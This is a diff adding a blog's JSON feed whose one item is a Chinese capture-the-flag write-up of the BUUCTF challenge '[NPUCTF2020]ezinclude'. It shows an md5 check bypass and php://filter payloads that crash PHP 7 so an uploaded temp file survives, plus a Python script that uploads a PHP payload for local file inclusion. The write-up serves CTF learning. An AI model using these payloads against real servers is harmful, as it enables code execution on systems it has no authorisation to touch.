@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"php7 segment fault特性\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/06/07/[NPUCTF2020]ezinclude/",
+            "url": "http://odiws.github.io/2024/06/07/[NPUCTF2020]ezinclude/",
+            "title": "'[NPUCTF2020]ezinclude'",
+            "date_published": "2024-06-07T14:00:34.000Z",
+            "content_html": "<h2 id=\"npuctf2020ezinclude\"><a class=\"markdownIt-Anchor\" href=\"#npuctf2020ezinclude\">#</a> [NPUCTF2020]ezinclude</h2>\n<p><img data-src=\"../images/%5BNPUCTF2020%5Dezinclude/2.png\" alt=\"2\"></p>\n<p>进去发现是用户名与密码错误</p>\n<p>F12 发现提示：</p>\n<p><img data-src=\"../images/%5BNPUCTF2020%5Dezinclude/3.png\" alt=\"3\"></p>\n<p>要 md5name 后的字符串等于 pass，不知道 pass，可以 bp 发现传送回来的东西有 hash 这个东西</p>\n<p>直接加入 pass 等于这个 hash 值得到：</p>\n<p><img data-src=\"../images/%5BNPUCTF2020%5Dezinclude/4.png\" alt=\"4\"></p>\n<p>得到 flflflflag.php 这个文件。</p>\n<p>但是他会直接进到 404.html 文件</p>\n<p>然后就不会了；接着就是大佬的操作了：</p>\n<p>大佬看到了 php 的版本 7.0.33，直接就是：</p>\n<h4 id=\"php7-segment-fault特性\"><a class=\"markdownIt-Anchor\" href=\"#php7-segment-fault特性\">#</a> php7 segment fault 特性</h4>\n<p>扫目录可得 dir.php</p>\n<blockquote>\n<p>…… 扫不出来</p>\n</blockquote>\n<blockquote>\n<p>向 PHP 发送含有文件区块的数据包时，让 PHP 异常崩溃退出，POST 的临时文件就会被保留</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>php &lt; 7.2<br>\nphp://filter/string.strip_tags/resource=/etc/passwd</li>\n<li>php7 老版本通杀<br>\n php://filter/convert.quoted-printable-encode/resource=data://,% bfAAAAAAAAAAAAAAAAAAAAAAA% ff% ff% ff% ff% ff% ff% ff% ffAAAAAAAAAAAAAAAAAAAAAAAA</li>\n</ul>\n</blockquote>\n<p>嫖个脚本：</p>\n<pre><code>import requests\nfrom io import BytesIO\n\nmode1 = &quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;\nmode2 = &quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;\nurl = &quot;http://93fed8e6-341b-499c-b41b-0f0a6288549b.node4.buuoj.cn:81/flflflflag.php?file=&quot;\n\nurl = url + mode1\npayload = &quot;&lt;?php phpinfo();?&gt;&quot;\n\nfiles = &#123;\n    &quot;file&quot;: BytesIO(payload.encode())\n&#125;\n\nres = requests.post(url=url, files=files, allow_redirects=False)\n\nprint(res.text)\n</code></pre>\n<p>访问 dir.php：</p>\n<p><img data-src=\"../images/%5BNPUCTF2020%5Dezinclude/5.png\" alt=\"5\"></p>\n<p>有个文件名，访问本地 file=/tmp/phpBWqZND</p>\n<p>该脚本写了一个 php 探针：直接 bp 访问该文件</p>\n<p>因为直接访问好像不能打开，会直接跳转到 404.html 文件里面，无法访问 php 探针。</p>\n<p><img data-src=\"../images/%5BNPUCTF2020%5Dezinclude/1.png\" alt=\"1\"></p>\n<p>获取 flag，完成撒花～～～～～～～～</p>\n",
+            "tags": [
+                "buuctf",
+                "php7 segment fault特性"
+            ]
+        }
+    ]
+}
